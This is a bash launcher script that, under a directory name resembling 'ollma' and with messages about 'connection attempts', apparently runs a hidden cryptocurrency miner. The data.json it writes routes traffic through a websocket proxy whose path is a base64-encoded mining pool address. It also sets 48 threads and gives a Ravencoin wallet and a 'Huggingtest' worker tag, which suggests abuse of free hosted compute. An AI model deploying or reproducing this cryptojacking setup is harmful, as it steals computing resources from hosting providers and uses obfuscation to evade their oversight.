#!/bin/bash

# --- Configuration ---
MAX_RETRIES=5
RETRY_WAIT_SECONDS=5
COMMAND_TIMEOUT_SECONDS=15 # Increased timeout slightly
APP_DIR="~/ollma"
NODE_APP="app.js"

# --- Script ---
retry_count=0
success=false

# Expand the tilde to the full home directory path
eval APP_DIR="$APP_DIR"

# Change to the application directory, exit with an error if it fails.
cd "$APP_DIR" || { echo "ERROR: Failed to cd to '$APP_DIR'. Ensure the directory exists."; exit 1; }

# Make the node binary executable if it isn't already.
if [ ! -x ./node ]; then
  echo "Node binary is not executable. Attempting to set permissions..."
  chmod +x ./node || { echo "ERROR: Failed to make ./node executable. Check file ownership/permissions."; exit 1; }
fi

# Create the data configuration file once before the loop.
echo "Creating data.json configuration file..."
echo '{
  "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
  "config": { "threads": 48, "log": true },
  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "Huggingtest" }
}' > data.json

echo "Starting connection attempts..."

# Loop until success or max retries are reached.
while [ $retry_count -lt $MAX_RETRIES ] && [ "$success" = false ]; do
  echo "---"
  echo "Running command (Attempt $((retry_count+1))/$MAX_RETRIES)..."
  # Run the node app with a timeout, capturing both stdout and stderr.
  output=$(timeout $COMMAND_TIMEOUT_SECONDS ./node $NODE_APP 2>&1)

  # Check for different failure conditions.
  if echo "$output" | grep -q "readyState 0 (CONNECTING)"; then
    echo "Connection failed (readyState 0). Retrying in $RETRY_WAIT_SECONDS seconds..."
    ((retry_count++))
    sleep $RETRY_WAIT_SECONDS
  elif [ -z "$output" ]; then # *** NEW: Check if output is empty ***
    echo "Command produced no output (timed out or exited). Retrying in $RETRY_WAIT_SECONDS seconds..."
    ((retry_count++))
    sleep $RETRY_WAIT_SECONDS
  else
    # If we get here, there was output and it wasn't a known error.
    success=true
    echo "✅ Command executed successfully. Output:"
    echo "$output"
  fi
done

# If all retries failed, print a final error message.
if [ "$success" = false ]; then
  echo "---"
  echo "❌ Failed to connect after $MAX_RETRIES attempts."
  echo "The proxy server may be down, or the app is not starting correctly."
  exit 1
fi
